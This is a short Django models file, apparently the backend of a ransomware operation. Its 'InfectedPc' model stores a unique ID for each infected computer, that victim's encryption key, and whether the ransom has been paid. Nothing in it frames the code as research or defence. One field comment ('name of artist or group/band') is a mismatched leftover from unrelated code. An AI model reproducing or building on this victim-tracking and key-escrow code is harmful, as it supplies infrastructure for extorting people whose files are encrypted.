from django.db import models

# Create your models here.
class InfectedPc(models.Model):
    # An unique ID that identifies every infected PC
    uniqueId = models.CharField(max_length=255, null=False)
    # name of artist or group/band
    encryptionKey = models.CharField(max_length=255, null=False)
    #ransom payment status
    paymentStatus = models.BooleanField(default=False)
